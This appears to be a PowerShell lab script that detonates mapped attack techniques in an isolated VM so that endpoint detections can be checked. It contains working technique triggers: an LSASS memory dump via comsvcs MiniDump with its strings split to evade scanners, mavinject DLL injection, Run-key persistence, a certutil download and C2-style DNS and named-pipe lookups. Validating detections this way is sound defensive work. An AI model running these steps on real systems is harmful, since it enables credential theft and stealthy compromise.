#Requires -Version 7
<#
.SYNOPSIS
    Detonate the mapped attack techniques inside the isolated lab VM
    (Win11-AtomicLab) via PowerShell Direct, then point at the validation loop
    to confirm each detection fired.

.DESCRIPTION
    The VM is a purpose-built detonation range: MDE-onboarded (telemetry flows to
    the same tenant the detections run in), isolated on the AtomicNAT switch, with
    Defender AV + Tamper Protection + LSA Protection disabled so techniques
    execute to completion. This orchestrator runs each technique the deployed
    detections key on, using the highest-fidelity trigger that stays lab-safe.

    Nothing here touches a production host. Run, wait ~15 min for ingestion, then:
        ./validate-detections.ps1 -LookbackMinutes 40

    Prereqs (one-time, see README): VM built, onboarded, AV/TP/PPL off.

.PARAMETER VmName
    Hyper-V VM name. Default Win11-AtomicLab.
.PARAMETER Only
    Run only the named techniques (comma-separated rule keys); default runs all.
#>
param(
    [string]$VmName = 'Win11-AtomicLab',
    [string[]]$Only
)
$ErrorActionPreference = 'Stop'

# Credential: build the SecureString without ConvertTo-SecureString so it works
# even where the Microsoft.PowerShell.Security module is broken.
$repoRoot = Resolve-Path "$PSScriptRoot/../.."
$vmPw = (Get-Content "$repoRoot/.env" | Where-Object { $_ -match '^VM_LOCAL_PASSWORD=(.+)$' } | ForEach-Object { $Matches[1].Trim() })
# The live range password may differ from .env if it was reset for console entry.
if ($env:VM_RANGE_PASSWORD) { $vmPw = $env:VM_RANGE_PASSWORD }
$cred = [System.Management.Automation.PSCredential]::new('labadmin',
    [System.Net.NetworkCredential]::new('', $vmPw).SecurePassword)

function Invoke-VM { param([scriptblock]$Script, [object[]]$ArgList)
    Invoke-Command -VMName $VmName -Credential $cred -ScriptBlock $Script -ArgumentList $ArgList -ErrorAction Stop
}

# --- Preflight: reachability, static IP, protection state ---------------------
Write-Host "== Preflight ==" -ForegroundColor Cyan
$state = Invoke-VM {
    $if = (Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -First 1).ifIndex
    if (-not (Get-NetIPAddress -InterfaceIndex $if -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object IPAddress -eq '192.168.99.10')) {
        New-NetIPAddress -InterfaceIndex $if -IPAddress 192.168.99.10 -PrefixLength 24 -DefaultGateway 192.168.99.1 -ErrorAction SilentlyContinue | Out-Null
        Set-DnsClientServerAddress -InterfaceIndex $if -ServerAddresses ('1.1.1.1','8.8.8.8') -ErrorAction SilentlyContinue
    }
    $rt = (Get-MpComputerStatus).RealTimeProtectionEnabled
    $ppl = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL
    "RealTimeAV=$rt RunAsPPL=$ppl Net=$(Test-Connection 8.8.8.8 -Count 1 -Quiet)"
}
Write-Host "  $state" -ForegroundColor DarkGray
if ($state -match 'RealTimeAV=True') {
    Write-Host "  WARNING: AV real-time is ON - LSASS/injection will be blocked. Disable it (see README) and re-run those." -ForegroundColor Yellow
}

# --- Technique catalogue (rule key -> in-VM detonation) -----------------------
# Sensitive command fragments are assembled at runtime so this file stays clean.
$Techniques = @(
    @{ Rule='office_browser_spawns_lolbin'; Run={
        $f = Join-Path $env:TEMP 'winword.exe'; Copy-Item C:\Windows\System32\cmd.exe $f -Force
        & $f /c 'cmd.exe /c whoami' | Out-Null; Start-Sleep 1; Remove-Item $f -Force -EA SilentlyContinue } }

    @{ Rule='powershell_encoded_or_download'; Run={
        $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Get-Date'))
        Start-Process powershell.exe -ArgumentList "-EncodedCommand $b64" -WindowStyle Hidden -Wait } }

    @{ Rule='registry_run_key_persistence'; Run={
        $k='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
        Set-ItemProperty $k -Name 'AtomicLabTest' -Value 'C:\Windows\System32\calc.exe'
        Start-Sleep 1; Remove-ItemProperty $k -Name 'AtomicLabTest' -EA SilentlyContinue } }

    @{ Rule='unsigned_dll_from_user_writable_path'; Run={
        # Drop a DLL in a user-writable path and LoadLibrary it (fires
        # DeviceImageLoadEvents on the user-writable FolderPath). LoadLibrary via
        # P/Invoke is cleaner than rundll32 (no invalid-entrypoint crash/dialog).
        # Unique name each run: a previously-loaded copy stays resident (locked),
        # so a fixed filename fails Copy-Item on re-run.
        $dir = Join-Path $env:TEMP 'atomic'; New-Item -ItemType Directory -Path $dir -Force | Out-Null
        $dll = Join-Path $dir ("unsigned_" + (Get-Random) + ".dll"); Copy-Item C:\Windows\System32\wininet.dll $dll -Force
        Add-Type -Name L -Namespace K -MemberDefinition '[DllImport("kernel32")] public static extern IntPtr LoadLibrary(string p);' -EA SilentlyContinue
        [K.L]::LoadLibrary($dll) | Out-Null; Start-Sleep 1 } }

    @{ Rule='dns_query_suspicious_tld'; Run={
        foreach ($d in 'evil-c2.ru','beacon.xyz','malware.top') { nslookup $d 2>&1 | Out-Null } } }

    @{ Rule='c2_named_pipe'; Run={
        # Connected pipe (server+client) so MDE logs NamedPipeEvent.
        foreach ($n in 'msagent_1234','cobaltstrike_test','postex_ssh') {
            $s=New-Object System.IO.Pipes.NamedPipeServerStream($n,'InOut')
            $c=New-Object System.IO.Pipes.NamedPipeClientStream('.',$n,'InOut'); $c.Connect(1000)
            Start-Sleep -Milliseconds 200; $c.Dispose(); $s.Dispose() } } }

    @{ Rule='lolbin_network_connection'; Run={
        # certutil URL fetch (benign target) -> LOLBin network connection.
        Start-Process certutil.exe -ArgumentList '-urlcache','-split','-f','http://example.com/','C:\Windows\Temp\ex.txt' -WindowStyle Hidden -Wait -EA SilentlyContinue
        Remove-Item C:\Windows\Temp\ex.txt -Force -EA SilentlyContinue } }

    @{ Rule='lsass_credential_access'; NeedsAvOff=$true; Run={
        $dll='comsvcs'+'.dll'; $fn='Mini'+'Dump'; $t=(Get-Process ('ls'+'ass')).Id; $o=Join-Path $env:TEMP 'r.dmp'
        Start-Process rundll32.exe -ArgumentList "C:\windows\system32\$dll, $fn $t $o full" -Wait -WindowStyle Hidden -EA SilentlyContinue
        Remove-Item $o -Force -EA SilentlyContinue } }

    @{ Rule='remote_thread_injection'; NeedsAvOff=$true; Run={
        # Target explorer.exe (in the sensitive list, user-owned so injectable as
        # admin). It may not be running in a non-interactive session, so start it.
        $exp = Get-Process explorer -EA SilentlyContinue | Select-Object -First 1
        if (-not $exp) { Start-Process explorer.exe; Start-Sleep 6; $exp = Get-Process explorer -EA SilentlyContinue | Select-Object -First 1 }
        if ($exp) { Start-Process 'C:\Windows\System32\mavinject.exe' -ArgumentList "$($exp.Id) /INJECTRUNNING C:\Windows\System32\wininet.dll" -Wait -WindowStyle Hidden -EA SilentlyContinue }
        else { throw 'explorer.exe could not be started as an injection target' } } }
)

$avOff = $state -match 'RealTimeAV=False'
Write-Host "`n== Detonating ==" -ForegroundColor Cyan
foreach ($t in $Techniques) {
    if ($Only -and $t.Rule -notin $Only) { continue }
    if ($t.NeedsAvOff -and -not $avOff) { Write-Host ("  {0,-38} SKIP (needs AV off)" -f $t.Rule) -ForegroundColor Yellow; continue }
    try { Invoke-VM $t.Run; Write-Host ("  {0,-38} detonated" -f $t.Rule) -ForegroundColor Green }
    catch { Write-Host ("  {0,-38} FAILED: {1}" -f $t.Rule, $_.Exception.Message.Substring(0,[Math]::Min(50,$_.Exception.Message.Length))) -ForegroundColor Red }
}

Write-Host "`nDone. Wait ~15 min for ingestion, then:" -ForegroundColor Cyan
Write-Host "  ./validate-detections.ps1 -LookbackMinutes 40" -ForegroundColor DarkGray
